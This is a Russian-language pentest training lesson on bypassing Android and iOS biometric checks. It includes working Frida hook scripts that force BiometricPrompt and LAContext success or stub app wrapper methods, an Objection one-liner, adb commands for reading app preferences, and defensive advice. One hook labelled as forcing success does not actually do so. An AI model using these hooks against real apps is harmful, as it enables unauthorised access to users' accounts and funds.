---
id: mobile-biometric
title: "Биометрия: обход fingerprint/face-аутентификации"
category: mobile
parent: mobile-sidechannels
difficulty: medium
order: 2
tags: [biometric, fingerprint, faceid, biometricprompt, bypass, frida, android, ios]
prerequisites: [mobile-insecure-storage, mobile-dynamic-frida]
useful_for:
  - "CTF Mobile (обход биометрии)"
  - "Bug bounty (логические обходы аутентификации)"
  - "Пентест мобильных приложений"
estimated_minutes: 30
summary: "Как приложения используют биометрию (BiometricPrompt, LocalAuthentication) и как обходить проверку через Frida-хуки; почему клиентская биометрия — не замена серверной аутентификации."
---
## Введение

Биометрия на мобильных устройствах — это **локальный** способ подтвердить, что устройство находится в руках владельца. Она не является серверным фактором аутентификации: приложение вызывает системный API (`BiometricPrompt` на Android, `LAContext`/Face ID/Touch ID на iOS), получает `true/false` и на основе этого решает, пускать ли пользователя дальше. Если решение принимается целиком на клиенте, его можно подделать хуком. Правильная архитектура подписывает операцию ключом из Keystore/Secure Enclave, но так делают редко.

Именно поэтому биометрия — классическая тема для логических обходов: она защищает от «подглядывания за паролем», но не от целенаправленной атаки на скомпрометированном устройстве.

## Как приложения используют биометрию

Android (современный API):

```java
BiometricPrompt prompt = new BiometricPrompt(activity, executor,
    new BiometricPrompt.AuthenticationCallback() {
        public void onAuthenticationSucceeded(AuthenticationResult r) {
            unlockVault(); // критичное действие здесь
        }
    });
prompt.authenticate(new BiometricPrompt.PromptInfo.Builder()
    .setTitle("Вход").build());
```

iOS:

```swift
let ctx = LAContext()
var err: NSError?
if ctx.canEvaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, error: &err) {
    ctx.evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics,
        localizedReason: "Вход") { ok, _ in
        if ok { self.unlockVault() }
    }
}
```

Уязвимость: и `onAuthenticationSucceeded`, и `evaluatePolicy` возвращают булево, которое можно подменить. Если после успеха приложение просто выставляет флаг `isAuthenticated = true` и хранит его в памяти, обход тривиален.

## Обход через Frida (Android)

```javascript
Java.perform(function () {
  // 1) форсировать успех в колбэке
  var CB = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');
  CB.onAuthenticationSucceeded.implementation = function (result) {
    console.log('[+] forcing biometric success');
    return this.onAuthenticationSucceeded(result);
  };
  // 2) подделать доступность биометрии
  var BM = Java.use('android.hardware.biometrics.BiometricManager');
  BM.canAuthenticate.overload('int').implementation = function (m) { return 0; };
});
```

Часто проще найти в приложении собственный метод-обёртку (`isBiometricValid`, `checkFingerprint`) и вернуть `true`:

```javascript
var Cls = Java.use('com.target.security.BiometricHelper');
Cls.isBiometricValid.overload().implementation = function () { return true; };
```

Обёртку ищите в декомпилированном коде: `grep -rn "Biometric\|Fingerprint\|isAuthenticated" jadx_out/`.

## Обход на iOS

```javascript
var LA = ObjC.classes.LAContext;
Interceptor.attach(LA['- evaluatePolicy:localizedReason:reply:'].implementation, {
  onEnter: function (args) {
    var reply = new ObjC.Block(args[4]);
    reply.implementation = function (success, error) {
      reply(true, NULL);   // всегда успех
    };
  }
});
```

Objection делает то же одной командой: `ios ui biometrics_bypass`.

## Где именно «настоящая» проверка

Ключевой вопрос пентеста: доверяет ли сервер клиентскому «я прошёл биометрию»? Если да — обход даёт полный доступ. Если критичное действие требует подписи ключом Keystore/Secure Enclave с `setUserAuthenticationRequired(true)` — подделать сложнее (нужен сам ключ). Проверьте:

- есть ли `setUserAuthenticationRequired`/`kSecAccessControlBiometryAny`;
- не хранится ли флаг аутентификации в SharedPreferences/Keychain без защиты;
- не уходит ли на сервер голое `biometric=true` без доказательства.

## Разобранный пример

Банк: после Face ID открывается список карт; сервер не перепроверяет. Пентестер хукает `LAContext.evaluatePolicy` → получает доступ к картам и операциям без биометрии. Отчёт: обход биометрической аутентификации, критичное действие защищено только клиентским флагом.

## Частые ошибки и подводные камни

- Хукать системный API, когда у приложения есть своя обёртка — ищите её первой (проще и стабильнее).
- Забыть, что `canEvaluatePolicy`/`canAuthenticate` может возвращать `false` на эмуляторе — это не уязвимость.
- Считать обход биометрии шумом: это high, если за ним стоят деньги/данные.
- Не проверить серверную сторону — там может быть вторая проверка (тогда обход не даёт доступа).
- Игнорировать device-credential fallback (`deviceOwnerAuthentication` вместо `...WithBiometrics`), который принимает PIN вместо биометрии.

## Справочная таблица

| Платформа | API | Хук обхода |
|-----------|-----|-----------|
| Android | `BiometricPrompt` | callback / обёртка |
| Android | `BiometricManager` | `canAuthenticate` |
| iOS | `LAContext` | `evaluatePolicy` |
| iOS | Keychain | `kSecAccessControlBiometryAny` |
| Оба | серверный фактор | проверить, что именно уходит |

## Что делать дальше / решение

- **Обёртка возвращает bool** → хукайте её, зафиксируйте PoC.
- **Флаг в SharedPreferences/Keychain** → покажите, что его можно выставить вручную.
- **Ключ Keystore с `setUserAuthenticationRequired`** → попробуйте подпись с device-credential fallback или ищите обход на root.
- **Сервер перепроверяет** → зафиксируйте как «клиентский обход не даёт доступа» и переходите к другим векторам.
- Severity: доступ к деньгам/данным через обход — High/Critical; обход без последствий — Low.

## Локальная аутентификация vs серверная: где проходит граница

Разберитесь, что именно защищает биометрия в конкретном приложении:

- **Только локальный экран:** биометрия открывает раздел, данные приходят с сервера по уже валидному токену. Обход = доступ к разделу (High, если там деньги/данные).
- **Разблокировка ключа:** биометрия разблокирует ключ в Keystore/Keychain, которым подписывается операция. Обход без ключа невозможен — это правильная модель.
- **Подтверждение операции:** сервер требует свежую аутентификацию (step-up). Обход локального флага не поможет, если сервер проверяет криптоподпись.

Проверьте на сервере: уходит ли голое `biometric=true`, или подпись/attestation. Если голое — находка.

## Тестирование через device-credential fallback

Многие приложения используют `deviceOwnerAuthentication` (биометрия ИЛИ PIN) вместо `...WithBiometrics`. Тогда вместо биометрии можно ввести PIN — но это ожидаемое поведение. Однако если приложение считает, что «биометрия прошла», хотя пользователь ввёл PIN, — это логическая неточность. Проверяйте, какой policy реально используется:

```bash
grep -rn "deviceOwnerAuthentication\|WithBiometrics\|BIOMETRIC_STRONG\|BIOMETRIC_WEAK" jadx_out/ | head
```

## Обход через подмену флага состояния

Частая ошибка — хранить результат биометрии в памяти или в SharedPreferences:

```javascript
// приложение хранит флаг
SharedPreferences prefs = ...; prefs.edit().putBoolean("bio_ok", true).apply();
```

Проверка: можно ли выставить флаг вручную (root/run-as для debuggable) и получить доступ без биометрии:

```bash
adb shell run-as com.target.app cat /data/data/com.target.app/shared_prefs/state.xml
```

Если `bio_ok=true` даёт доступ — модель сломана.

## Рекомендации по защите

- Привязывать критичные ключи к аутентификации (`setUserAuthenticationRequired(true)`, `kSecAccessControlBiometryAny`).
- Не доверять клиентскому булеву; требовать серверную проверку/подпись.
- Использовать `BIOMETRIC_STRONG` и `CryptoObject` в `BiometricPrompt`.
- Не хранить флаг аутентификации в открытом виде; сбрасывать его при сворачивании приложения.
- Не логировать биометрические события и не передавать их как «доказательство».

## Практический PoC обхода биометрии (Android)

Пошаговый сценарий для отчёта:

```bash
# 1) найти обёртку биометрии в декомпилированном коде
grep -rn "BiometricPrompt\|FingerprintManager\|isAuthenticated\|biometric" jadx_out/ | head
# 2) подключиться Frida и захукать обёртку
frida -U -f com.target.app -l bypass.js
```

```javascript
Java.perform(function () {
  var H = Java.use('com.target.security.BiometricHelper');
  H.isAuthenticated.implementation = function () {
    console.log('[+] biometric bypassed');
    return true;
  };
});
```

Затем переходим на защищённый экран и убеждаемся, что доступ получен без отпечатка/лица. Фиксируем: экран, действие, отсутствие серверной проверки.

## Проверка серверной перепроверки

Чтобы понять, действительно ли обход даёт доступ, проверьте, что происходит после локального «успеха»: уходит ли на сервер подписанный запрос или просто токен сессии. Если сервер выдаёт данные по существующему токену — модель клиентская, обход эффективен. Если сервер требует свежую подпись ключа — обход не даёт доступа, и это правильная архитектура.

```bash
# смотрим трафик после «успешной» биометрии
mitmproxy -p 8080   # + pinning bypass при необходимости
```

## Итоговая оценка

Обход биометрии — это не «взлом», а демонстрация того, что защита критичного действия построена на клиентском решении. Ценность находки определяется последствиями: доступ к платежам, персональным данным или приватным ключам повышает severity до High/Critical; доступ к некритичному экрану — до Medium/Low.

## Квиз

```quiz
- question: "Почему клиентскую биометрию можно обойти?"
  options:
    - "Решение принимается в приложении по булеву результату API"
    - "Она всегда серверная"
    - "Она использует TLS"
    - "Она хранится в Keychain"
  answer: 0
  explanation: "Если приложение само доверяет true/false, результат можно подменить хуком."
- question: "Какой Android API используется для биометрии?"
  options:
    - "BiometricPrompt"
    - "KeyguardManager только"
    - "AccountManager"
    - "TelephonyManager"
  answer: 0
  explanation: "BiometricPrompt — современный API аутентификации по биометрии."
- question: "Какой iOS-класс отвечает за локальную аутентификацию?"
  options:
    - "LAContext"
    - "UIApplication"
    - "NSURLSession"
    - "WKWebView"
  answer: 0
  explanation: "LAContext.evaluatePolicy выполняет проверку Face ID/Touch ID."
- question: "Что делает обход биометрии действительно опасным?"
  options:
    - "Критичное действие защищено только клиентским флагом"
    - "Приложение использует HTTPS"
    - "Устройство новое"
    - "Биометрия включена в настройках"
  answer: 0
  explanation: "Без серверной проверки или подписи ключом обход даёт полный доступ."
- question: "Какой флаг Keystore делает ключ недоступным без аутентификации пользователя?"
  options:
    - "setUserAuthenticationRequired(true)"
    - "setRandomizedEncryptionRequired"
    - "setKeySize"
    - "setBlockMode"
  answer: 0
  explanation: "Этот флаг привязывает использование ключа к успешной аутентификации."
```

## Где пригодится

- **CTF Mobile:** задачи, где биометрия — единственная преграда к флагу.
- **Bug bounty:** обход биометрии с доступом к деньгам/данным — high/critical.
- **Пентест:** проверка моделей аутентификации в банковских и крипто-приложениях.
- **Работа:** ревью архитектуры аутентификации (клиент vs сервер).
